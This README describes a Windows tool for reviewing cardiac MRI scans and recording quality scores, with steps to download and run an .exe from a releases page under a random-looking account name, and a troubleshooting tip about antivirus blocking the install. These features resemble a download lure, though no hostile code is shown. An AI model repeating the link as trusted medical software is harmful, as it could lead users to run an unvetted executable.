# 🫀 CMR_QC_Studio - Review cardiac MRI scans with ease

[![Download Software](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/brandnewnessmapinguari504/CMR_QC_Studio/releases)

CMR_QC_Studio helps medical professionals review heart scan data. It provides a simple workspace to examine images and record quality scores. You can identify scan errors, suggest adjustments, and save your progress. The application organizes feedback for individual patients. It keeps work separate for every user on the system.

## 🛠 Prerequisites

This software runs on Windows 10 and Windows 11. You need a modern web browser to view the interface. Chrome, Firefox, or Edge will work well. Ensure you have at least 4GB of available memory on your computer. Your display should support a resolution of 1920x1080 pixels for the clearest image quality.

## 📥 How to Install

1. Visit the [releases page](https://github.com/brandnewnessmapinguari504/CMR_QC_Studio/releases) to download the installer.
2. Select the file ending in `.exe` for Windows.
3. Save the file to your desktop or downloads folder.
4. Double-click the file to start the installation.
5. Follow the prompts on the screen to finish setup.
6. Look for a new icon on your desktop named CMR_QC_Studio.

## 🚀 Getting Started

Launch the program using the desktop icon. The application opens a login screen in your default browser. Enter your credentials to begin your session. If you do not have an account, contact your system administrator to generate your login information within the `users.json` file. 

Once logged in, the main dashboard appears. This area shows your available datasets. Select a file from the dropdown menu to load a specific patient list. The system remembers your choice. You do not need to log in again if you switch between files during your workday.

## 👁 Using the Review Interface

The screen splits into three panels to display your scans:

- **Left Panel:** Displays the patient list and current scan status.
- **Center Panel:** Shows the medical images for the cardiac phases.
- **Right Panel:** Contains the review tools to annotate and submit scores.

Use the navigation buttons to move between patients. You can pause, restart, or skip through scans at your own speed using the playback controls at the bottom of the center window.

## 📝 Submitting Annotations

Check each image for segmentation errors. When you identify an issue, click the appropriate button in the right panel. The options include:

- **Accept:** Marks the scan for use without changes.
- **Reject:** Notes that the scan failed quality thresholds.
- **Fine-Tune:** Requests pixel-level adjustments for the automated model.
- **Unclassified:** Labels the entry for later review.

The system saves your comments automatically when you change patient records. Each decision writes directly to your private storage folder. This ensures your work remains safe even if the system closes unexpectedly.

## 🔒 Data Security

This tool prioritizes data integrity. Every user profile stores information in a specific folder. Other users cannot see or change your saved work. The system uses session tokens to manage access. These tokens remain active for three days. You do not need to enter your username or password every time you open the app during this period. After three days, the system asks for your login details again to maintain safety.

## 📂 Managing Datasets

You can load multiple datasets to compare results or handle different project groups. The dataset management feature handles file structure changes in the background. If a patient folder contains files for both End-Diastole and End-Systole, the application presents them side-by-side. This layout simplifies the comparison process. You can see the full heartbeat cycle and verify that annotations match the tissue boundaries.

## ⚙️ Troubleshooting

If the software fails to open, check the following:

- Verify your internet connection if the application requires a remote server.
- Ensure no other instance of the program runs in the background.
- Check if your antivirus software blocked the installation process.
- Restart your computer to clear pending updates or locked files.

For persistent issues, clear your browser cache specifically for the address localhost:8000. This action forces the application to load fresh settings. If the images do not display, confirm the path to your data folder uses only valid characters. Spaces or special symbols in folder names sometimes cause display errors. Rename these folders to use simple letters and numbers to resolve potential file access gaps.

## 📈 Performance Tips

The application behaves best when your data files sit on a fast local disk. Avoid running the software from a network drive or a slow external thumb drive. High-speed local access improves the speed of frame rendering. If you notice a delay when switching patients, minimize high-resource applications like video editors or large spreadsheets while you work on your reviews.